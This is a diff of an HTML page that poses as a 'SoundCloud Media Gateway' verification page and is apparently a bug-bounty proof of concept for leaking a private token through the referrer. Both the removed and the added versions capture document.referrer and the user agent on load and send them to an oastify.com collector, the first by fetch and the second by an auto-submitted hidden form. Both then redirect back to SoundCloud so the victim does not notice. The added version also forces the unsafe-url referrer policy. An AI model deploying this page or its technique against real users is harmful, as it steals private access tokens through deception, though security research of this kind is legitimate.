@@ -1,37 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <title>Verifying... </title>
+    <meta name="referrer" content="unsafe-url">
+    <title>SoundCloud Media Gateway</title>
 </head>
-<body>
-    <script>
-        // 1. Capture the data immediately
-        const capturedRef = document.referrer;
-        
-        // 2. Prepare the exfiltration payload
-        const report = {
-            alert: "PRIVATE_TOKEN_EXFILTRATED",
-            // This is the specific secret token we need
-            secret_url: capturedRef, 
-            ua: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        };
-
-        // 3. Send to Oastify
-        fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(report)
-        });
-
-        // 4. Redirect back to avoid suspicion
-        setTimeout(() => {
-            window.location.href = capturedRef || "https://soundcloud.com/discover";
-        }, 1500);
-    </script>
-    <div style="font-family: Arial; text-align: center; margin-top: 50px;">
-        <p>Loading SoundCloud Secure Player...</p>
+<body onload="leakData()">
+    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
+        <h2>Verifying Track Access...</h2>
+        <p>Please wait, establishing secure connection to SoundCloud servers.</p>
     </div>
+
+    <form id="leakForm" action="https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/log" method="POST" style="display:none;">
+        <input type="hidden" name="captured_token" id="tokenField">
+        <input type="hidden" name="user_agent" id="uaField">
+    </form>
+
+    <script>
+        function leakData() {
+            // 1. Grab the referrer via JS - this is the "Secret Token"
+            const ref = document.referrer;
+            
+            // 2. Fill the hidden form
+            document.getElementById('tokenField').value = ref;
+            document.getElementById('uaField').value = navigator.userAgent;
+
+            // 3. Submit the form to Oastify
+            document.getElementById('leakForm').submit();
+
+            // 4. Redirect back to SoundCloud after 2 seconds
+            setTimeout(() => {
+                window.location.href = ref || "https://soundcloud.com";
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
